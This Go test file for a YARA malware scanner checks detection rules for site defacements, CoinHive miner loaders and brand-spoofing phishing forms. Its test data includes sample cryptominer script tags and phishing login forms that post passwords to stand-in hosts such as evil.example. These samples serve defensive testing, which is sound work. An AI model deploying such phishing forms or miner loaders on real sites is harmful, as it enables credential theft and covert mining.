//go:build yara

package yara

import (
	"strings"
	"testing"
)

func TestFPFlood_DefaceHackedBy_WordfenceProse(t *testing.T) {
	s := loadRepoYaraScanner(t)
	legitimate := [][]byte{
		[]byte("=== Wordfence Security ===\nWeb Application Firewall stops you from getting hacked by identifying malicious traffic."),
		[]byte("<h1>Security guidance</h1><p>Getting hacked by identifying malicious traffic can be prevented.</p>"),
		[]byte("<p>Getting hacked by identifying malicious traffic can be prevented.</p><h1>Security guidance</h1>"),
	}
	for _, body := range legitimate {
		if hasYaraRule(s.ScanBytes(body), "deface_hacked_by") {
			t.Errorf("deface_hacked_by FP: matched prose outside a heading: %s", body)
		}
	}
	for _, mal := range [][]byte{
		[]byte("<html><head><title>Hacked By xShadow</title></head><body><h1>Hacked By xShadow</h1></body></html>"),
		[]byte("<center><h2>hacked by MoroccanGhosts</h2></center>"),
		[]byte("<H1>HACKED BY xShadow</H1>"),
		[]byte("<center><font color=red><b>Hacked By xShadow</b></font></center>"),
	} {
		if !hasYaraRule(s.ScanBytes(mal), "deface_hacked_by") {
			t.Errorf("deface_hacked_by regression: real defacement heading not detected: %s", mal)
		}
	}
}

func TestFPFlood_MinerCoinhive_BotUaList(t *testing.T) {
	s := loadRepoYaraScanner(t)
	legitimate := [][]byte{
		[]byte("<?php return array('bots'=>array('Googlebot','bingbot','CoinHive','AhrefsBot','SemrushBot'));"),
		[]byte("renew CoinHive membership; renew AuthedMine membership"),
	}
	for _, body := range legitimate {
		if hasYaraRule(s.ScanBytes(body), "miner_coinhive") {
			t.Errorf("miner_coinhive FP: matched a bare or embedded brand mention: %s", body)
		}
	}
	for _, mal := range [][]byte{
		[]byte("<" + "script src=\"https://coinhive.com/lib/coinhive.min.js\"></" + "script>"),
		[]byte("var miner=new CoinHive.Anonymous('SITE_KEY'); miner." + "start();"),
		[]byte("<" + "script src=\"https://authedmine.com/lib/authedmine.min.js\"></" + "script>"),
		[]byte("var miner = new CoinHive({siteKey: 'SITE_KEY'}); miner.start();"),
		[]byte("var miner = new AuthedMine({siteKey: 'SITE_KEY'}); miner.start();"),
	} {
		if !hasYaraRule(s.ScanBytes(mal), "miner_coinhive") {
			t.Errorf("miner_coinhive regression: real CoinHive loader not detected: %s", mal)
		}
	}
}

func TestFPFlood_PhishingPaypal_AdminPageAndScatteredJs(t *testing.T) {
	s := loadRepoYaraScanner(t)
	adminPage := []byte("<div class=\"cn-welcome\"><a href=\"https://paypal.com/donate\">Support us via PayPal</a>\n<form method=\"post\" action=\"payment\" data-action=\"save\"><input type=\"password\" name=\"api_secret\"></form></div>")
	if hasYaraRule(s.ScanBytes(adminPage), "phishing_paypal") {
		t.Error("phishing_paypal FP: matched a plugin admin settings page")
	}
	scattered := []byte("/*! jQuery Migrate */ var paypal={};" + strings.Repeat("x", 200_000) +
		`var s='<form action="/collect.php"><input type="password">';`)
	if hasYaraRule(s.ScanBytes(scattered), "phishing_paypal") {
		t.Error("phishing_paypal FP: matched scattered tokens in minified JS")
	}
	mal := []byte("<html><body><h2>Log in to your PayPal account</h2>\n<form action=\"https://evil.example/collect.php\" method=\"post\">\n<input type=\"email\" name=\"email\"><input type=\"password\" name=\"pass\"><button>Log In</button>\n</form></body></html>")
	if !hasYaraRule(s.ScanBytes(mal), "phishing_paypal") {
		t.Error("phishing_paypal regression: real PayPal phishing page not detected")
	}
}

func TestFPFlood_PhishingCollectorVariants(t *testing.T) {
	s := loadRepoYaraScanner(t)
	tests := []struct {
		name   string
		rule   string
		brand  string
		action string
	}{
		{name: "paypal absolute URL", rule: "phishing_paypal", brand: "PayPal", action: "https://evil.example/collect"},
		{name: "office365 root path", rule: "phishing_office365", brand: "Office365", action: "/collect"},
		{name: "sharepoint relative path", rule: "phishing_sharepoint", brand: "SharePoint", action: "./collect"},
		{name: "paypal root", rule: "phishing_paypal", brand: "PayPal", action: "/"},
		{name: "bank script query", rule: "phishing_bank_generic", brand: "online banking account number", action: "collect.php?step=1"},
		{name: "bank script path info", rule: "phishing_bank_generic", brand: "online banking account number", action: "collect.php/next"},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			body := []byte(tc.brand + `<form action="` + tc.action + `" method="post"><input type="password"></form>`)
			if !hasYaraRule(s.ScanBytes(body), tc.rule) {
				t.Errorf("%s regression: collector action %q was not detected", tc.rule, tc.action)
			}
		})
	}
}

func TestFPFlood_PhishingRejectsPseudoHTMLAttributes(t *testing.T) {
	s := loadRepoYaraScanner(t)
	rules := []struct {
		name  string
		brand string
	}{
		{name: "phishing_paypal", brand: "PayPal"},
		{name: "phishing_office365", brand: "Office365"},
		{name: "phishing_sharepoint", brand: "SharePoint"},
		{name: "phishing_bank_generic", brand: "online banking account number"},
	}
	for _, tc := range rules {
		t.Run(tc.name, func(t *testing.T) {
			legitimate := [][]byte{
				[]byte(tc.brand + `<form action="settings" data-action="/collect"><input type="password"></form>`),
				[]byte(tc.brand + `<form action="/collect"><div data-type="password"></div></form>`),
				[]byte(tc.brand + `<form title=" action='/collect'" action="settings"><input type="password"></form>`),
				[]byte(tc.brand + `<form action="/collect"><input title=" type='password'"></form>`),
				[]byte(tc.brand + `<form action="collect.phpx"><input type="password"></form>`),
			}
			for _, body := range legitimate {
				if hasYaraRule(s.ScanBytes(body), tc.name) {
					t.Errorf("%s FP: pseudo collector or password attribute matched: %s", tc.name, body)
				}
			}
		})
	}
}

func TestFPFlood_PhishingOffice365Sharepoint_Structure(t *testing.T) {
	s := loadRepoYaraScanner(t)
	adminO365 := []byte("<p>Connect your office365 mailbox</p><form action=\"settings\"><input type=\"password\" name=\"smtp_pass\"></form>")
	if hasYaraRule(s.ScanBytes(adminO365), "phishing_office365") {
		t.Error("phishing_office365 FP: matched a settings form with a route action")
	}
	malO365 := []byte("<h1>Sign in to Office365</h1><form action=\"/harvest.php\" method=\"post\"><input type=\"password\"></form>")
	if !hasYaraRule(s.ScanBytes(malO365), "phishing_office365") {
		t.Error("phishing_office365 regression: real Office365 phishing not detected")
	}
	malSP := []byte("<title>SharePoint Online</title>secured by Microsoft<form action=\"https://x.workers.dev/c\" method=\"post\"><input type=\"email\"><input type=\"password\"></form>window.location.replace(u)")
	if !hasYaraRule(s.ScanBytes(malSP), "phishing_sharepoint") {
		t.Error("phishing_sharepoint regression: real SharePoint phishing not detected")
	}
}

func TestFPFlood_PhishingCorrelatesOnePasswordField(t *testing.T) {
	s := loadRepoYaraScanner(t)
	tests := []struct {
		name  string
		rule  string
		brand string
	}{
		{name: "paypal", rule: "phishing_paypal", brand: "PayPal"},
		{name: "office365", rule: "phishing_office365", brand: "Office365"},
		{name: "sharepoint", rule: "phishing_sharepoint", brand: "SharePoint"},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			body := []byte(`<form action="/collect.php"><input type="password"></form>` +
				strings.Repeat("x", 2500) + tc.brand + `<input type="password">`)
			if hasYaraRule(s.ScanBytes(body), tc.rule) {
				t.Errorf("%s FP: correlated the collector and brand with different password fields", tc.rule)
			}
		})
	}
}

func TestFPFlood_PhishingBankBrandProximity(t *testing.T) {
	s := loadRepoYaraScanner(t)
	legitimate := [][]byte{
		[]byte("online banking account number" + strings.Repeat("x", 2500) +
			`<form action="/collect.php"><input type="password"></form>`),
		[]byte("online banking" + strings.Repeat("x", 2500) +
			`account number<form action="/collect.php"><input type="password"></form>`),
	}
	for _, body := range legitimate {
		if hasYaraRule(s.ScanBytes(body), "phishing_bank_generic") {
			t.Errorf("phishing_bank_generic FP: matched distant banking prose: %s", body)
		}
	}
	malicious := []byte(`online banking account number<form action="/collect.php"><input type="password"></form>`)
	if !hasYaraRule(s.ScanBytes(malicious), "phishing_bank_generic") {
		t.Error("phishing_bank_generic regression: nearby credential collector was not detected")
	}
}

func TestFPFlood_PhishingProximityWindows(t *testing.T) {
	s := loadRepoYaraScanner(t)
	near := []byte(`PayPal<form action="/collect.php">` + strings.Repeat("x", 1400) + `<input type="password"></form>`)
	if !hasYaraRule(s.ScanBytes(near), "phishing_paypal") {
		t.Error("phishing_paypal regression: collector and password inside the proximity window were not correlated")
	}
	brandAfter := []byte(`<form action="/collect.php"><input type="password">` + strings.Repeat("x", 100) + `PayPal</form>`)
	if !hasYaraRule(s.ScanBytes(brandAfter), "phishing_paypal") {
		t.Error("phishing_paypal regression: brand after the password field was not correlated")
	}
	farCollector := []byte(`PayPal<form action="/collect.php">` + strings.Repeat("x", 1600) + `<input type="password"></form>`)
	if hasYaraRule(s.ScanBytes(farCollector), "phishing_paypal") {
		t.Error("phishing_paypal FP: collector outside the password proximity window was correlated")
	}
	farBrand := []byte(`PayPal` + strings.Repeat("x", 2100) + `<form action="/collect.php"><input type="password"></form>`)
	if hasYaraRule(s.ScanBytes(farBrand), "phishing_paypal") {
		t.Error("phishing_paypal FP: brand outside the password proximity window was correlated")
	}
}
